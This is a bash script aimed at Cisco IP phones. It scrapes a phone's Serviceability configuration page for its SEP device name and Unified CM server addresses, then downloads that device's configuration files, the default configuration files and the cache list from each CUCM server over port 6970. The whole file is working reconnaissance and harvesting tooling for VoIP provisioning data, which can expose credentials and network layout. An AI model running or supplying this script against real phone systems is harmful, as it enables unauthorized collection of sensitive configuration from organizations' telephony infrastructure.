#!/usr/bin/env bash

#set -ex

phone="${1}"

if [[ -z "${phone}" ]]
then
    echo "missing phone http[s]://IP as first argument"
fi


config_page="/CGI/Java/Serviceability?adapter=device.statistics.configuration"




content=$(curl --connect-timeout 20 -k "${phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration" 2>/dev/null)

if [[ -z "${content}" ]]
then
    echo -e "[!] Failed to pull configuration page content\n Try increasing the timeout"
    exit 1
fi

echo "[+] Got device configuration page"

device=$(grep -Eo -m1 'SEP[0-9A-Fa-f]{1,20}' <<< ${content})

if [[ -z "${device}" ]]
then
    echo "[!] Failed to extract device name"
    exit 1
fi

echo "[+] Got device name "


mapfile -t cucm_ips < <(grep -oE 'Unified CM.*Information' <<< ${content} | grep -oE '([0-9]{1,3}.){3}[0-9]{1,3}')

if [[ ${#cucm_ips[@]} -eq 0 ]]
then
    echo "[!] Failed to obtain at least 1 CUCM IP address"
    exit 1
fi

echo "[+] Got ${#cucm_ips[@]} CUCM IP(s)"


ext1=".cnf.xml"
ext2=".cnf.xml.sgn"
default1="SEPDefault"
default2="ConfigFileCacheList.txt"


mkdir -pv ./tmp

for cucm in "${cucm_ips[@]}"; do
    filename1="${cucm}_${device}${ext1}" # SEPDEADBEEF.cnf.xml
    filename2="${cucm}_${device}${ext2}" # SEPDEADBEEF.cnf.xml.sgn

    defaultfile1="${cucm}_${default1}${ext1}" # SEPDefault.cnf.xml
    defaultfile2="${cucm}_${default1}${ext2}" # SEPDefault.cnf.xml.sgn

    defaultfile3="${cucm}_${default2}" # ConfigFileCacheList.txt
    defaultfile4="${cucm}_${default2}.sgn" # ConfigFileCacheList.txt.sgn


    curl -k --connect-timeout 10 "http://${cucm}:6970/${device}${ext1}" -o "./tmp/${filename1}" 2>/dev/null
    if [[ -f "./tmp/${filename1}" && ! -s "./tmp/${filename1}" ]]
    then
        rm "./tmp/${filename1}"
    else
        echo "[+] Pulled ./tmp/${filename1}"
    fi

    curl -k --connect-timeout 10 "http://${cucm}:6970/${device}${ext2}" -o "./tmp/${filename2}" 2>/dev/null
    if [[ -f "./tmp/${filename2}" && ! -s "./tmp/${filename2}" ]]
    then
        rm "./tmp/${filename2}"
    else
        echo "[+] Pulled "./tmp/${filename2}""
    fi


    curl -k --connect-timeout 10 "http://${cucm}:6970/${default1}${ext1}" -o "./tmp/${defaultfile1}" 2>/dev/null
    if [[ -f "./tmp/${defaultfile1}" && ! -s "./tmp/${defaultfile1}" ]]
    then
        rm "./tmp/${defaultfile1}"
    else
        echo "[+] Pulled "./tmp/${defaultfile1}""
    fi

    curl -k --connect-timeout 10 "http://${cucm}:6970/${default1}${ext2}" -o "./tmp/${defaultfile2}" 2>/dev/null
    if [[ -f "./tmp/${defaultfile2}" && ! -s "./tmp/${defaultfile2}" ]]
    then
        rm "./tmp/${defaultfile2}"
    else
        echo "[+] Pulled "./tmp/${defaultfile2}""
    fi

    curl -k --connect-timeout 10 "http://${cucm}:6970/$default2" -o "./tmp/${defaultfile3}" 2>/dev/null
    if [[ -f "./tmp/${defaultfile3}" && ! -s "./tmp/${defaultfile3}" ]]
    then
        rm "./tmp/${defaultfile3}" 
    else
        echo "[+] Pulled "./tmp/${defaultfile3}" "
    fi
    curl -k --connect-timeout 10 "http://${cucm}:6970/$default2.sgn" -o "./tmp/${defaultfile4}" 2>/dev/null
    if [[ -f "./tmp/${defaultfile4}" && ! -s "./tmp/${defaultfile4}" ]]
    then
        rm "./tmp/${defaultfile4}"
    else
        echo "[+] Pulled "./tmp/${defaultfile4}""
    fi

done
